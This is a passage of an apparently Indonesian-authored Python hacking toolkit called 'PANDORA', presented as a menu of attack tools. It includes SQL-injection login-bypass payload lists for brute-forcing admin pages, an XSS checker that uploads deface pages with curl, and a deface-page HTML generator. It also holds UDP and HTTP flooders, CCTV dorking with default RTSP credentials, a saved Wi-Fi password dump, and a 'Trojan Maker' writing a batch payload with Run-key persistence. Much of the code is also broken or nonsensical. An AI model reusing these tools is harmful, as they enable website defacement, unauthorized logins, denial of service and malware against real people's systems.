                    os.system(f'net rpc user info --leak-report {target}')
                elif s == ("3"):
                    pass
                    target = input("Input target ip : ")
                    time.sleep(0.5)
                    os.system(f'net rpc user info --leak-report-full {target}')
                elif s == ("4"):
                    trgt = input(f'IP Target : ')
                    port = input("Port : ")
                    
                    def flood(trgt, port):
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        b = 5000000
                        sent = 5000
                        s.sendto(b, (trgt, port))
                            
                    while True:
                        pass
                        sent = 5000
                        sent = sent + 1
                        time.sleep(0.5)
                        print(success + f"Jammering {trgt} On Port {port}", s)
                elif s == ("5"):
                    try:
                        targets = input(f'IP Target : ')
                        port = input(f'Port : ')
                        time.sleep(0.5)
                        print("Please Wait..")
                        time.sleep(0.5)
                    
                        dork = ['inurl:', 'intitle:']
                        dork2 = ['cctv', 'view.shtml']
                        for e in dork:
                            file_exists = ('.google-cookie')
                            if file_exists == True:
                                os.remove(file_exists)
                            print(f"Finding {targets} CCTV..")
                            for s in dork2:
                                pass
                                for results in search(f'{e}{s} {targets}:{port}', tld='com', num=1, start=0, stop=None):
                                    response = requests.get(results)
                                    if response.status_code == 200:
                                        print(success + f'Found : ')
                                        print(results)
                                    else:
                                        print(fail + f'Cant Find {targets} CCTV')
                                yes = input(fail + f'Do you wanna retry? Y/N : ')
                                
                                if yes.startswith('Y' or 'y'):
                                    pass
                                    targets = input(f'IP Target : ')
                                    port = input(f'Port : ')
                                    time.sleep(0.5)
                                    print("Please Wait..")
                                    time.sleep(0.5)
                                
                                    dozher = f'rtsp://admin:123456a@{targets}:{port}/streaming/channels/102'
                                    print(info + f'{dozher}')
                    except KeyboardInterrupt:
                        exit()                
            elif m == ("3"):
                pass
                print("""\033[1;33m
                1. Database Info (Coming Soon)
                2. Leak Report (single)
                3. Leak Report (all)
                4. \033[1;91m<!>\033[1;34m Disrupting the Connection \033[1;91m<!>\033[1;33m
                5. CCTV Finder
                """)
                s = input("Select : ")
               
                if s ==("1"):
                    pass
                    print("""\033[1;33m
                    [ + ] Coming Soon ! [ + ]
                    """)
                elif s == ("2"):
                    pass
                    target = input("Input target ip : ")
                    print(f'\033[1;34m')
                    time.sleep(0.5)
                    os.system(f'net ads user info --leak-report {target}')
                elif s == ("3"):
                    pass
                    target = input("Input target ip : ")
                    print(f'\033[1;34m')
                    time.sleep(0.5)
                    os.system(f'net ads user info --leak-report-full {target}')      
                elif s == ("4"):
                    trgt = input(f'IP Target : ')
                    port = input("Port : ")
                    
                    def flood(trgt, port):
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        b = 5000000
                        sent = 5000
                        s.sendto(b, (trgt, port))
                            
                    while True:
                        pass
                        sent = 5000
                        sent = sent + 1
                        time.sleep(0.5)
                        print(success + f"Jammering {trgt} On Port {port}", s)
                elif s == ("5"):
                    try:
                        targets = input(f'IP Target : ')
                        port = input(f'Port : ')
                        time.sleep(0.5)
                        print("Please Wait..")
                        time.sleep(0.5)
                    
                        dork = ['inurl:', 'intitle:']
                        dork2 = ['cctv', 'view.shtml']
                        for e in dork:
                            file_exists = ('.google-cookie')
                            if file_exists == True:
                                os.remove(file_exists)
                            print(f"Finding {targets} CCTV..")
                            for s in dork2:
                                pass
                                for results in search(f'{e}{s} {targets}:{port}', tld='com', num=1, start=0, stop=None):
                                    response = requests.get(results)
                                    if response.status_code == 200:
                                        print(success + f'Found : ')
                                        print(results)
                                    else:
                                        print(fail + f'Cant Find {targets} CCTV')
                                        yes = input(fail + f'Do you wanna retry? Y/N : ')
                            
                                        if yes.startswith('Y' or 'y'):
                                            pass
                                            targets = input(f'IP Target : ')
                                            port = input(f'Port : ')
                                            time.sleep(0.5)
                                            print("Please Wait..")
                                            time.sleep(0.5)
                                   
                                            dozher = f'rtsp://admin:123456a@{targets}:{port}/streaming/channels/102'
                                            print(info + f'{dozher}')    
                    except KeyboardInterrupt:
                        exit()                        
        elif e =="2":
                pass
                print('\033[1;91m_' *22)
                print('\033[1;33m1. IP Monitoring')
                print('\033[1;34m2. IP Manager Address')
                print('\033[1;33m3. IP Addr')
                print('\033[1;34m4. Scan YOUR Wifi')
                print('\033[1;33m5. IP Ioam')
                print('\033[1;34m6. Servers List')
                print('\033[1;91m_' *22)
                print('')
                exe = input('\033[1;32mSelect : ')
            
                if exe == ("1"):
                    print('\033[1;32m')
                    os.system('ip -force monitor')
                elif exe == ("2"):
                    print('\033[1;32m')
                    os.system('ip maddr')
                elif exe == ("3"):
                    print('\033[1;32m')
                    os.system('ip addr')
                elif exe == ("4"):
                    print('\033[1;32m')
                    os.system('ip -s netconf')
                    os.system('ip -s token')
                    print('\033[1;91m_' *22)
                    print('\033[1;33mAvailable Connector : ')
                    print('')
                    os.system('ip -j neighbour')
                    os.system('ip -j neighbor')
                    print('\033[1;91m_' *22)
                elif exe == ("5"):
                    pass
                    print("""\033[1;33m
                    1. Name Space Show
                    2. Name Space Add ID [Data DATA32] [Wide Data 64]
                    3. Name Space Del ID
                    4. Schema SHOW
                    5. Schema ADD Id DATA
                    6. Schema Del ID 
                    7. Name Space Set ID Schema {ID | None }
                    """)
                    print('')
                    i = input('Select : ')
                   
                    if i == ("1"):
                        try:
                            print('\033[1;32m')
                            os.system('ip -a ioam namespace show')
                        except ('Cannot open netlink socket'):
                            print(fail + f"Wh00pz !, Looks like you aren't root")
                    elif i == ("2"):
                        print('\033[1;32m')
                        e = input(f'ID : ')
                        os.system(f'ip -a ioam namespace add {e}') 
                    elif i == ("3"):
                        try:
                            print('\033[1;32m')
                            e = input(f'ID : ')
                            os.system(f'ip -a ioam namespace del {e}')
                        except ('Cannot open netlink socket'):
                            print(fail + f"Wh00pz !, Looks like you aren't root")
                    elif i == ("4"):
                        try:
                            print('\033[1;32m')
                            os.system(f'ip -a ioam schema show')
                        except ('Cannot open netlink socket'):
                            print(fail + f"Wh00pz !, Looks like you aren't root") 
                    elif i == ("5"):
                        try:
                            print('\033[1;32m')
                            e = input(f'ID : ')
                            os.system(f'ip -a ioam schema add {e}')
                        except ('Cannot open netlink socket'):
                            print(fail + f"Wh00pz !, Looks like you aren't root")        
                    elif i == ("6"):
                        try:
                            print('\033[1;32m')
                            e = input(f'ID : ')
                            os.system(f'ip -a ioam schema del {e}')
                        except ('Cannot open netlink socket'):
                            print(fail + f"Wh00pz !, Looks like you aren't root")            
                    elif i == ("7"):
                        try:
                            print('\033[1;32m')
                            e = input(f'ID : ')
                            os.system(f'ip -a ioam set {e} schema')
                        except ('Cannot open netlink socket'):
                            print(fail + f"Wh00pz !, Looks like you aren't root")      
                elif exe == ("6"):
                    pass
                    def Socks():
                        os.system('apt install q')
                        os.system('q')
                        print('')
                        sel = input('Select Option : ')
                        print('Wait..')
                        time.sleep(0.5)
                        print('')
                        os.system(f'q {sel}')
                        y = input(f'IP Addresses : ')
                        print('Wait..')
                        time.sleep(0.5)
                        print('')
                        os.system(f'q {sel} {y}')
                    while True:
                        pass
                        os.system('apt install q')
                        os.system('q')
                        print('')
                        sel = input('Select Option : ')
                        print('Wait..')
                        time.sleep(0.5)
                        print('')
                        os.system(f'q {sel}')
                        y = input(f'IP Addresses : ')
                        print('Wait..')
                        time.sleep(0.5)
                        print('')
                        os.system(f'q {sel} {y}')       
        if e == "3":
            time.sleep(0.5)
            os.system("""for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content")""")
        elif e == "4":
            try:
                frq = 125
                frq = frq + 25
                def main():
                    ir = IRremote(Pin(28))
                    while True:
                        print(info + f"Sending {frq} Frequency..")
                        ir.send(frq, True)
                        print(info + f"Cooldown 5 sec..")
                        time.sleep(5)

                if __name__ == "__main__":
                    main()
            except ModuleNotFoundError or ImportError or NameError is True:
                print("Did you have raspberry pi 4 ?")
        elif e == "5":
            pass
            if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
                os.system('ip -f link -o -a -c a')
                os.system('ip -f inet -o -a -c a')
                os.system('ip -f inet6 -o -a -c a')
            elif os.name == 'nt':   # Untuk sistem Windows
                os.system('net share')
                os.system('net user')
                os.system('net localgroup Administrators')
        elif e == "6":
            try:
                target = input(f"IP : ")
                port = 80
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                i = int(1)
                byte = int(21)
                while True:
                    
                    i += 8
                    byte += 50
                    print(f"[ + ] Sending {i} Signal To {target}, {byte}")
                    for e in range(i):
                        e = f"http://{target}"
                        res = requests.get(e)
                        if res.status_code == 200:
                            response = requests.post(e)
                    col = green, blue, yellow, white
                    rand = random.choice(col)
                    if res.status_code == 200:
                        print(rand + f"[ + ] : {target} {i} {byte} [ + ]")
                    elif res.status_code == 403 or 404 or TimeoutError:
                        print(fail + f"[!] Web Server : {target} Is Down Or Forbidden.. {i} [!]")
            except ModuleNotFoundError and KeyboardInterrupt:
                exit()
elif answer == ("18"):
    pass
    print(f"""{red}
    
     ▄▄▄       █    ██ ▄▄▄█████▓ ▒█████     ▒██   ██▒ ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
    ▒████▄     ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒   ▒▒ █ █ ▒░▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
    ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒   ░░  █   ░▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
    ░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░    ░ █ █ ▒ ▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
     ▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░ ████▓▒░   ▒██▒ ▒██▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
     ▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░    ▒▒ ░ ░▓ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
      ▒   ▒▒ ░░░▒░ ░ ░     ░      ░ ▒ ▒░    ░░   ░▒ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
      ░   ▒    ░░░ ░ ░   ░      ░ ░ ░ ▒      ░    ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
          ░  ░   ░                  ░ ░      ░    ░               ░  ░    ░ ░   ░           
                                                                                        
    """)
    site = input(f"Target Site : ")
    print(info + f"Fill This Input With Your Script Deface Name !, And Save The Script Deface File On Your /emulated/storage/0 !")
    files2 = input(f'\nFile [example : hai.html] : ')
    file_path = f'/storage/emulated/0/{files2}'
    print("Please Wait..")
    time.sleep(0.5)
    d = ['?id=', '?message=', '?in=', '?ID=', '?page=', '?session=', '?about=', '?add=', '?page_cart=', '?cart=', '?list=', '?index=', '?add_new=', '?addTag=', '?addSite=', '?adm=', '?pass=', '?show_msg=', '?show=', '?api=', '?auth_user=', '?approved=', '?redirect=', '?html=', '?text=']
    for y in d:
        o = site + y
        response = requests.get(o)
        if response == True or response.status_code == 200:
            pass
            print(success + f"Ok Result")
            print(f"{site}{y}")
            print(info + f"Injecting With XSS...")
            keyword = "Hacked By Someone"
            xss = '<h1>Hacked+By+Someone</h1>'
            xsr = str(f'{o}{xss}')
            blue = '\033[1;34m'
            print(success + xsr)
            print(info + f"Checking...")
            response = requests.get(xsr)
            if response.status_code == 200:
                if re.search(keyword, response.text, re.IGNORECASE):
                    print(success + f"\033[1;34mThe Site Has A Vuln.")
                    print(blue + xsr)
                else:
                    print(fail + f"Site Has No Vuln Or Parameter")
            else:
                print('')
    response = os.system(f'curl -T {file_path} {site}')
    admin_paths = ['/admin/', '/admin/dashboard/', '/admin/login.php/', '/wp-admin/', '/login.php/', '/wp-admin.php/', '/wp-admin/index.php', '/admin/dashboard.html/', '/admin.html/', '/admin/', '/usuarios/', '/cpanel.php/', '/cpanel/', '/cpanel.htm/', '/controlpanel/', '/admin/upload.php/', '/wp-login.php/', '/administrator/', '/admin/add.php/', '/dashboard/', '/admin/dashboard/', '/admin/dashboard.php/', '/panel/', '/admin/panel/', '/adminpanel/', '/admin/controlpanel/', '/admin/cpanel/', '/admin/dashboard.php/', '/admin.html/', '/admin.php/', '/admin/cpanel.php/', '/admin/cp.php/', '/adm', '/administrator/index.html', '/panelcontrol', '/dash', '/admin/dash.php']
    
    for result in admin_paths:
        file_exists = ('.google-cookie')
        if file_exists == True:
            os.remove(file_exists)
        print(f'Searching Admin Page..')
        url = site + result
        response = requests.get(url)
        if response.status_code == 200:
            print(info + f'Found ! ')
            print(response)
            print(url)
        else:
            print(fail + f'Cant Find Admin Page')    
    print(success + f"Auto XPLOIT Done.")
    # Mengecek apakah file berhasil diunggah
    if response == True:
        print(fail + f"File Failed Uploaded.")
    else:
        print(success + f"Deface Results: ")
        print(f'{site}/{files2}')     
elif answer == ("19"):
    pass
    print("""
    
     ▄▄▄· ·▄▄▄▄  • ▌ ▄ ·. ▪   ▐ ▄      ▄ .▄▄• ▄▌▄▄▄▄· 
    ▐█ ▀█ ██▪ ██ ·██ ▐███▪██ •█▌▐█    ██▪▐██▪██▌▐█ ▀█▪
    ▄█▀▀█ ▐█· ▐█▌▐█ ▌▐▌▐█·▐█·▐█▐▐▌    ██▀▐██▌▐█▌▐█▀▀█▄
    ▐█ ▪▐▌██. ██ ██ ██▌▐█▌▐█▌██▐█▌    ██▌▐▀▐█▄█▌██▄▪▐█
     ▀  ▀ ▀▀▀▀▀• ▀▀  █▪▀▀▀▀▀▀▀▀ █▪    ▀▀▀ · ▀▀▀ ·▀▀▀▀ 
                  ADMIN HUB THE BYPASSER
""")
    # URL halaman login
    login_url = input(info + f"Target Site : ")  # Ganti dengan URL halaman login yang sesuai

    nick_lines = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%", "'or 1=1 limit 1 -- -+", "'or 1=1 limit 1 - -+"]
    password_lines = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%", "'or 1=1 limit 1 -- -+", "'or 1=1 limit 1 - -+"]

    login_success = False
    for nick in nick_lines:
        for password in password_lines:
            # Membuat payload untuk data login
            payload = {
                'username': nick,
                'password': password
            }

            # Melakukan permintaan POST untuk login
            session = requests.Session()
            
            print(green + f"---------------------------")
            print(info + f"Trying Nick: {nick}")
            print(f"Password: {password}")
            print(green + f"---------------------------")
            headers = {}
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            response = session.post(login_url, data=payload, headers=headers)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Temukan token CSRF jika diperlukan
            csrf_token1 = soup.find('input', {'username': 'csrf_token'})['value'] if soup.find('input', {'name': 'csrf_token'}) else ''
            csrf_token2 = soup.find('input', {'password': 'csrf_token'})['value'] if soup.find('input', {'name': 'csrf_token'}) else ''
            
            csrf_token = csrf_token1 + csrf_token2
            
            # Tambahkan token CSRF ke data login
            payload['csrf_token'] = csrf_token
            # Memeriksa apakah login berhasil
            keyword = 'Welcome' or 'Dashboard' or 'Menu'
            if re.search(keyword, response.text, re.IGNORECASE):
                print(success + f'Login Success !')
                print(response)
            else:
                print(fail + f'Login Failed.')
                print(response)
    print(info + f"Results: ")
    print(response)
    print(f"{green}-" *12)
    print("LOGIN RESULTS : ")
    print(payload)
    print(f"{green}-" *12)
elif answer == ("20"):
    if os.name == "posix":
        os.system('clear')
    elif os.name == "nt":
        os.system('cls')
    print(info + f'            [ ]Remember !, If The Tools Had A Error, Please Waiting For The Update.[ ]')
    print(f"""    {yellow}┌─────────────────────────────────────────────────────────────────────────────────────────────────┐{blue}
    {yellow}│{blue} [01] WP Bypasser {red}[Hot Results]{blue}                     [11] Simple Pentest                          {yellow}│{blue}
    {yellow}│{blue} [02] Bypasser Admin V4 {red}[Hot Results]{blue}               [12] Mass Dorks {red}[Ok Results]{blue}                 {yellow}│{blue}
    {yellow}│{blue} [03] Deface SC Maker                               [13] {green}Deface Maker V2{blue}                         {yellow}│{blue}
    {yellow}│{blue} [04] Trojan Maker                                  [14] Phone Hunter                            {yellow}│{blue}
    {yellow}│{blue} [05] Bypasser Admin With ID {red}[Hot Results]{blue}          [15] CCTV Hunter                             {yellow}│{blue}
    {yellow}│{blue} [06] Leaker Tools V3 {red}[Hot Results]{blue}                 [16] Heart                                   {yellow}│{blue}
    {yellow}│{blue} [07] Mass Deface V3                                [17] BXB maker                               {yellow}│{blue}
    {yellow}│{blue} [08] DIRBER                                        [18] HTTP FLOOD                              {yellow}│{blue}
    {yellow}│{blue} [09] Bypass Admin With File.txt                                                                 {yellow}│{blue}
    {yellow}│{blue} [10] Leaker V4 {red}[Hot Results]{blue}                                                                    {yellow}│{blue}
    {yellow}└─────────────────────────────────────────────────────────────────────────────────────────────────┘{blue}
    """)
    print('')
    print(f'\033[37m')
    print(f"╭─[{yellow} PANDORA@localhost {white} ~/more")
    answer = input("╰─$ ")
    
    if answer == ("1"):
        pass
        if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
            os.system('clear')
        elif os.name == 'nt':   # Untuk sistem Windows
            os.system('cls')
        print(f"""{green}
                  .                                                      .
                .n                   .                 .                  n.
          .   .dP                  dP                   9b                 9b.    .
         4    qXb         .       dX                     Xb       .        dXp     t
        dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
        9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
         9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
          `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
            `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
                ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                                )b.  .dbo.dP'`v'`9b.odb.  .dX(
                              ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                             dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                            dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                            9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                             `'      9XXXXXX(   )XXXXXXP      `'
                                      XXXX X.`v'.X XXXX
                                      XP^X'`b   d'`X^XX
                                      X. 9  `   '  P )X
                                      `b  `       '  d'
                                       `             '
                                        Admin Killer
                                    Powered By : MrSanZz
        """)
        login_url = input(info + f"Target Page Login : ")
        nick_lines = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%", "admin", "", "admin123", "admin123456789", "'or 1=1 limit 1 -- -+", "'or 1=1 limit 1 - -+", "'or 1=1 limit 1 -- -+"]
        password_lines = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%", "admin", "", "admin123", "admin123456789", "'or 1=1 limit 1 -- -+", "'or 1=1 limit 1 - -+", "'or 1=1 limit 1 -- -+"]

        for nick in nick_lines:
            for password in password_lines:
                try:
                    # Membuat payload untuk data login
                    payload = {
                        'username': nick,
                        'password': password
                    }

                    # Melakukan permintaan POST untuk login
                    session = requests.Session()
            
                    print(green + f"---------------------------")
                    print(info + f"Trying Nick: {nick}")
                    print(f"Password: {password}")
                    print(green + f"---------------------------")
                    response = session.post(login_url, data=payload)
                    soup = BeautifulSoup(response.text, 'html.parser')

                    # Temukan token CSRF jika diperlukan
                    csrf_token1 = soup.find('input', {'name': 'csrf_token'}, id='user_login')['value'] if soup.find('input', {'name': 'csrf_token'}, id='user_login') else ''
                    csrf_token2 = soup.find('input', {'name': 'csrf_token'}, id='user_pass')['value'] if soup.find('input', {'name': 'csrf_token'}, id='user_pass') else ''
            
                    csrf_token = csrf_token1 + csrf_token2
                    # Tambahkan token CSRF ke data login
                    payload['csrf_token'] = csrf_token
                    # Memeriksa apakah login berhasil
                    keyword = 'Login Success' or 'Dashboard' or 'Welcome'
                    
                    if re.search(keyword, response.text, re.IGNORECASE):
                            print(success + f'Login Success !')
                            print(response)
                            break  # Keluar dari loop jika login berhasil
                    else:
                        print(fail + f'Login Failed.')
                        print(response)
                except requests.exceptions.ReadTimeout:
                    print("Request Timed Out, Please Wait..")
                    continue
        print(info + f"Results: ")
        print(response)
        print(f"{green}-" *12)
        print("LOGIN RESULTS : ")
        print(payload)
        print(f"{green}-" *12)
    elif answer == ("2"):
        pass
        user1 = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%", "admin", "", "admin123", "admin123456789", "'or 1=1 limit 1 -- -+", "'or 1=1 limit 1 - -+"]
        password1 = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%", "admin", "", "admin123", "admin123456789", "'or 1=1 limit 1 -- -+", "'or 1=1 limit 1 - -+"]
        print(f"""{blue}
                                    ,-.                               
               ___,---.__          /'|`\          __,---,___          
            ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.       
          ,'        |           ~'\     /`~           |        `.      
         /      ___//              `. ,'          ,  , \___      \    
        |    ,-'   `-.__   _         |        ,    __,-'   `-.    |    
        |   /          /\_  `   .    |    ,      _/\          \   |   
        \  |           \ \`-.___ \   |   / ___,-'/ /           |  /  
         \  \           | `._   `\\  |  //'   _,' |           /  /      
          `-.\         /'  _ `---'' , . ``---' _  `\         /,-'     
             ``       /     \    ,='/ \`=.    /     \       ''          
                     |__   /|\_,--.,-.--,--._/|\   __|                  
                     /  `./  \\`\ |  |  | /,//' \,'  \                  
                    /   /     ||--+--|--+-/-|     \   \                 
                   |   |     /'\_\_\ | /_/_/`\     |   |                
                    \   \__, \_     `~'     _/ .__/   /            
                     `-._,-'   `-._______,-'   `-._,-'
                      HATCHER ADMIN LOGIN BY MRSANZZ""")
        url = input(green + f"Admin Page Target : ")
        for user in user1:
            for password in password1:
                def bypass_admin_page(url, user, password):
                    """
                    Bypass admin webpages
                    """
                session = requests.Session()
                print(info + f"Bypassing With Username: {user}")
                print(info + f"Password : {password}")
                username = user
                password = password
                auth = (username, password)
                headers = {}
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                response = requests.get(url,headers=headers, data="user='%s'" % username + "&pass='%s'" % password)
                key = 'Dashboard' or 'Welcome'
                if re.search(key, response.text, re.IGNORECASE):
                    print(success + f"Succesfully Login With:")
                    print(success + f"USERNAME : {username}")
                    print(success + f"PASSWORD : {password}")
                    print(response)
                else:
                    print(fail + f"Login Failed")
                    print(response)
        print("Done..")
    elif answer == ("3"):
        pass
        nick = input(f"Attacker Name : ")
        Team = input(f"Team Name : ")
        pg = input(f"Image For Script Deface : ")
        msg = input(f"Message : ")
        grts = input(f"Greetz : ")
        file_name = input(f"File Name : ")
        sc1 = f"""<head>
        <title>Hacked By {nick}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta charset="utf-8">
        <link rel="preconnect" href="https://fonts.gstatic.com">
        <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
        <table width="100%" height="90%">
	        <tbody><tr><td align="center">
        <br><br>
        <br><br><font color="white">
        <i>
        <img src="{pg}" style="width:300px; height:300px; border-width:0;">
        </a><br>
        """
        sc2 = """
        <style>
        body {
            font-family: monospace;
            font-color: white;
            background-color: grey;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #333;
        }
        </style>
        """
        sc3 = f"""<title>{nick}</title>

        <div class="typewriter">
          <h1>oh no! the security has been hacked! by {nick}</h1><br>
          <h1>TEAM : {Team}</h1>
        </div>
        </font>

        <b><br><font color="white"><font size="4">
        Message : <br>
        {msg} <br><br>

        <hacked><br><br>
        <font size="3" color="red"> Greetz:</font><br>

        [<font color="red">{grts}</span></font> ]
        <body>
        <br><br>
        </audio>

        </audio>
        </body>
        </html>

        </head>
        <body>

        <body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
        """
        sc = sc1 + sc2 + sc3
        
        def logging(file_name):
            try:
                time.sleep(0.5)
                file = open((file_name) + ".html", "a")
                file.write(str(sc))
                file.close()
                file_name = file_name
                print(success + f"Success make file {file_name}")
            except FileExistsError:
                print(f"File {file_name} Already Exists !")
        logging(file_name)
    elif answer == ("4"):
        pass
        file_name = input(f"File Name : ")
        extension = input(f"Save AS [Example : bat, exe, vbs]: ")
        trojan = "@Echo offcolor 4title 4title R.I.Pstartstartstartstart calccopy %0 %Systemroot%\Greatgame > nulreg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ/d %systemroot%\Greatgame.bat /f > nulcopy %0 *.bat > nulAttrib +r +h Greatgame.batAttrib +r +hRUNDLL32 USER32.DLL.SwapMouseButtonstart calcclstskill msnmsgrtskill LimeWiretskill iexploretskill NMainstartclscd %userprofile%\desktopcopy Greatgame.bat R.I.P.batcopy Greatgame.bat R.I.P.jpgcopy Greatgame.bat R.I.P.txtcopy Greatgame.bat R.I.P.exe"
        def log(file_name):
            file = open((file_name) + f".{extension}", "a")
            file.write(str(trojan))
            file.close
            file_name = file_name
            print(f"File Trojan {file_name} Has Been Created !")
            print(f"Warning stupid !, Dont you dare to click / open the file !")
        log(file_name)
    if answer == ("5"):
        pass
        if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
            os.system('clear')
        elif os.name == 'nt':   # Untuk sistem Windows
            os.system('cls')
        print(f"""{blue}
                  .                                                      .
                .n                   .                 .                  n.
          .   .dP                  dP                   9b                 9b.    .
         4    qXb         .       dX                     Xb       .        dXp     t
        dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
        9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
         9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
          `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
            `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
                ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                                )b.  .dbo.dP'`v'`9b.odb.  .dX(
                              ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                             dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                            dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                            9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                             `'      9XXXXXX(   )XXXXXXP      `'
                                      XXXX X.`v'.X XXXX
                                      XP^X'`b   d'`X^XX
                                      X. 9  `   '  P )X
                                      `b  `       '  d'
                                       `             '
                                        Admin Killer
                                    Powered By : MrSanZz
        """)
        login_url = input(green + f"Target Page Login : ")
        idn = input(f"ID For Username : ")
        idp = input(f"ID For Password : ")
